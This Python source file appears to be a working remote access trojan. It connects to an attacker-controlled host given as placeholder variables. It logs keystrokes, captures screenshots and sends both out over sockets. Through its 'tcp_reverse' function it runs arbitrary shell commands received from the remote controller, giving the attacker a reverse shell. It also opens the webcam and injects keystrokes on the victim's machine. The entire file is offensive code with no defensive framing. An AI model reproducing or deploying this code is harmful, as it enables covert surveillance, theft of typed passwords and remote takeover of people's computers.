import string
import requests
import socket
import subprocess
import shlex
from threading import Thread
from typing import Dict, Callable
from time import sleep
from PIL import ImageGrab
from os.path import exists
from os import remove
from pynput import keyboard
__aplhanum = list(string.ascii_letters+string.digits)
__data = []
__add_data = ""
HOST= SPYTHON_HOST
PORT= SPYTHON_PORT 
IMAGE_NAME = "img.jpeg"
def __screenshot():
   image = ImageGrab.grab()
   image.save(IMAGE_NAME)
   with open(IMAGE_NAME, "rb") as fp:
        data = fp.read()
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s_sock:
            s_sock.connect((HOST,PORT+2))
            s_sock.send(data)
   if exists(IMAGE_NAME):
           remove(IMAGE_NAME)
   else:
        pass  
def listen(port):
 with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as ksock:
       ksock.connect((HOST,port+1))
       def send_keystroke():
           if len(__data) > 0:
             payload = "".join(__data)
             try:
                 ksock.send(payload.encode())    
             except:
               pass
             __data.clear()
           else:
               pass
           thread= Thread(target=send_keystroke,daemon=True)
           sleep(5)
           thread.start()
       def on_press(key):
           pass
       def on_release(key):
        try:
           if str(key).strip("\'") in __aplhanum:
              globals()["__data"].append(str(key).strip("\'"))
           elif key == keyboard.Key.space:
              globals()["__data"].append(" ") 
           elif key == keyboard.Key.enter:
               globals()["__data"].append("\n")
           elif key == keyboard.Key.tab:
               globals()["__data"].append("\t")
           elif key == keyboard.Key.backspace and len(__data) > 0 :
               globals()["__data"].pop()
           elif key == keyboard.Key.esc:
               return False
           else :
               pass
        except :
               pass    
       with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
           send_keystroke()
           listener.join()
def list_dir(sock):
      dir_items = subprocess.run("dir",shell=True,capture_output=True,text=True)
      globals()["__add_data"] += dir_items.stdout
      sock.send(__add_data.encode())
      globals()["__add_data"] = ""
def open_cmd():
    try:
       Keyboard = keyboard.Controller()
       with Keyboard.pressed(keyboard.Key.cmd):
            Keyboard.tap("r")
       sleep(0.5)
       Keyboard.type("cmd")
       sleep(0.5)
       Keyboard.tap(keyboard.Key.enter)   
    except:
       print("error") 
def open_camera():
    try:
       Keyboard = keyboard.Controller()
       with Keyboard.pressed(keyboard.Key.cmd):
            Keyboard.tap("r")
       sleep(0.5)
       Keyboard.type("microsoft.windows.camera:")
       sleep(0.5)
       Keyboard.tap(keyboard.Key.alt)   
       Keyboard.tap(keyboard.Key.f4)   
    except:
       print("error") 
def Open(app:str):
    Keyboard = keyboard.Controller()
    with Keyboard.pressed(keyboard.Key.cmd):
         Keyboard.tap("r")
    sleep(2)
    Keyboard.type(app)
    sleep(0.5)
    Keyboard.tap(keyboard.Key.enter)
    sleep(5)
def send_key(data:str):
    Keyboard = keyboard.Controller()
    Keyboard.type(data)
    Keyboard.tap(keyboard.Key.enter)

def full_screen():
    Keyboard = keyboard.Controller()
    with Keyboard.pressed(keyboard.Key.cmd):
         Keyboard.tap(keyboard.Key.up)

def exit_prog():
    Keyboard = keyboard.Controller()
    with Keyboard.pressed(keyboard.Key.alt):
         Keyboard.tap(keyboard.Key.f4)

def minimise():
    Keyboard = keyboard.Controller()
    with Keyboard.pressed(keyboard.Key.cmd):
         Keyboard.tap(keyboard.Key.down)
def enter():
    Keyboard = keyboard.Controller()
    Keyboard.tap(keyboard.Key.enter)
def right():
    Keyboard = keyboard.Controller()
    Keyboard.tap(keyboard.Key.right)

def left():
    Keyboard = keyboard.Controller()
    Keyboard.tap(keyboard.Key.left)
def tcp_reverse(sock):
     while True:
          incoming_command = shlex.split(sock.recv(1024).decode())
          try:  
            if incoming_command[0] == "exit":
               break
          except IndexError:
               continue
          output = subprocess.run(incoming_command,shell=True,capture_output=True,text=True)
          if output.returncode == 0:
             sock.send(output.stdout.encode())
          else:
             sock.send(output.stderr.encode())
commands_no_args = {"screenshot": __screenshot,"cmd": open_cmd,"camera": open_camera,"fullscreen": full_screen,"exit_prog": exit_prog,"minimise":minimise,"enter": enter,"right":right,"left":left}
commands_sock_arg = {"list":list_dir,"tcp_reverse":tcp_reverse}
commands_args = {"open": Open,"type": send_key}
def tcp_connection():
   with socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM) as s:
         s.connect((HOST,PORT))
         while True:
            try:
               command = s.recv(1024).decode().rstrip("\n")
               if command in commands_no_args:
                  commands_no_args[command]() 
               elif command in commands_sock_arg:
                    commands_sock_arg[command](s)   
               elif shlex.split(command)[0].lower() in commands_args:
                    commands_args[shlex.split(command)[0].lower()](shlex.split(command)[1])
               elif command == "break":
                    break
               else:
                   s.send("Invalid command !".encode())
            except IndexError:
                s.send("Invalid arguement format, see documentation.".encode())         
                pass
if __name__ == "__main__":
    tcp_thread = Thread(target=tcp_connection,daemon=True)
    listener_thread = Thread(target=listen,args=(PORT,))
    tcp_thread.start()
    listener_thread.start()
    tcp_thread.join()
    listener_thread.join()
    exit()
